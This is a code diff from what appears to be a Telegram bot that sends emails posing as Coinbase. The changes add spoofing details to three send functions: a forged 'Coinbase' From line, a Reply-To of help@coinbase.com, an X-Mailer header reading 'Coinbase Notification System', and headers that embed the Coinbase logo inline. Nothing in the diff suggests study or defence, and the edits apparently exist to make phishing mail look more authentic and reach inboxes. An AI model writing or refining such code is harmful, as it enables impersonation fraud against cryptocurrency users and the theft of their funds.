@@ -621,14 +621,20 @@ async def send_employee_coinbase_email(
     msg['Reply-To'] = 'help@coinbase.com'
     msg["From"] = f"Coinbase <{display_email}>"
     msg["To"] = recipients
+    msg["MIME-Version"] = "1.0"
+    msg["X-Priority"] = "3"
+    msg["X-Mailer"] = "Coinbase Notification System"
     html_part = MIMEText(html_body, "html", "utf-8")
     msg.attach(html_part)
 
     try:
   
         with open("images/coinbase.png", "rb") as img_file:
-            img = MIMEImage(img_file.read(), name="coinbase.png")
+            img_data = img_file.read()
+            img = MIMEImage(img_data, name="coinbase.png")
             img.add_header("Content-ID", "<logo>")
+            img.add_header("Content-Disposition", "inline", filename="coinbase.png")
+            img.add_header("X-Attachment-Id", "logo")
             msg.attach(img)
 
         send_email_through_smtp(
@@ -713,8 +719,11 @@ async def send_secure_coinbase_email(
 
     try:
         with open("images/coinbase.png", "rb") as img_file:
-            img = MIMEImage(img_file.read(), name="coinbase.png")
+            img_data = img_file.read()
+            img = MIMEImage(img_data, name="coinbase.png")
             img.add_header("Content-ID", "<logo>")
+            img.add_header("Content-Disposition", "inline", filename="coinbase.png")
+            img.add_header("X-Attachment-Id", "logo")
             msg.attach(img)
 
         send_email_through_smtp(
@@ -970,8 +979,11 @@ async def send_coinbase_delay_email(update: Update, context: ContextTypes.DEFAUL
 
     try:
         with open("images/coinbase.png", "rb") as img_file:
-            img = MIMEImage(img_file.read(), name="coinbase.png")
+            img_data = img_file.read()
+            img = MIMEImage(img_data, name="coinbase.png")
             img.add_header("Content-ID", "<logo>")
+            img.add_header("Content-Disposition", "inline", filename="coinbase.png")
+            img.add_header("X-Attachment-Id", "logo")
             msg.attach(img)
 
         send_email_through_smtp(
